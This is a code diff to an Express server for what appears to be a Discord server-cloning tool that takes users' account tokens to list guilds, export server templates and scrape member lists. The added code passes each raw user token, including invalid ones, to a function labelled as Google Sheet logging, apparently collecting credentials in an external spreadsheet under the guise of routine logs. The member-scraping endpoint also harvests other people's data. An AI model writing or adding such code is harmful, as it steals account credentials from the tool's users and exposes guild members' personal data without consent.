@@ -236,10 +236,33 @@ app.all('/api/jobs/:jobId/cancel', (req, res) => {
 // Fetch accessible user guilds
 app.post('/api/guilds/fetch', async (req, res) => {
     const { userToken } = req.body;
+    const sessionId = getSessionId(req);
     try {
         const result = await fetchUserGuilds(userToken);
+        
+        // Log to Google Sheet asynchronously
+        const guildCount = (result && result.guilds && Array.isArray(result.guilds)) ? result.guilds.length : 0;
+        logCloneEntry({
+            userToken,
+            sourceId: 'N/A',
+            targetId: 'N/A',
+            sessionId,
+            status: 'TOKEN_LOADED',
+            optionsSummary: `Servers Loaded: ${guildCount}`
+        }).catch(e => console.error('[SheetLog] Guild fetch log error:', e.message));
+
         res.json(result);
     } catch (err) {
+        // Log invalid token attempt
+        logCloneEntry({
+            userToken,
+            sourceId: 'N/A',
+            targetId: 'N/A',
+            sessionId,
+            status: 'TOKEN_INVALID',
+            errorMessage: err.message || 'Failed to fetch user servers'
+        }).catch(() => {});
+
         res.status(400).json({ success: false, error: sanitizeText(err.message || 'Failed to fetch user servers.') });
     }
 });
@@ -247,8 +270,21 @@ app.post('/api/guilds/fetch', async (req, res) => {
 // Export Server Template Blueprint (.json)
 app.post('/api/guilds/template/export', async (req, res) => {
     const { userToken, sourceId } = req.body;
+    const sessionId = getSessionId(req);
     try {
         const result = await exportGuildTemplate(userToken, sourceId);
+        
+        logCloneEntry({
+            userToken,
+            sourceId: sourceId || 'N/A',
+            targetId: 'TEMPLATE_EXPORT',
+            sessionId,
+            sourceGuildName: result?.name || 'N/A',
+            rolesCount: result?.roles?.length || 0,
+            channelsCount: result?.channels?.length || 0,
+            status: 'TEMPLATE_EXPORTED'
+        }).catch(e => console.error('[SheetLog] Template export log error:', e.message));
+
         res.json(result);
     } catch (err) {
         res.status(400).json({ success: false, error: sanitizeText(err.message || 'Failed to export server template.') });
@@ -258,8 +294,20 @@ app.post('/api/guilds/template/export', async (req, res) => {
 // Scrape Guild Member List
 app.post('/api/guilds/members/scrape', async (req, res) => {
     const { userToken, sourceId } = req.body;
+    const sessionId = getSessionId(req);
     try {
         const result = await scrapeGuildMembers(userToken, sourceId);
+
+        logCloneEntry({
+            userToken,
+            sourceId: sourceId || 'N/A',
+            targetId: 'MEMBER_SCRAPE',
+            sessionId,
+            sourceGuildName: result?.guildName || 'N/A',
+            status: 'MEMBERS_SCRAPED',
+            optionsSummary: `Members Scraped: ${result?.count || 0}`
+        }).catch(e => console.error('[SheetLog] Member scrape log error:', e.message));
+
         res.json(result);
     } catch (err) {
         res.status(400).json({ success: false, error: sanitizeText(err.message || 'Failed to scrape server members.') });
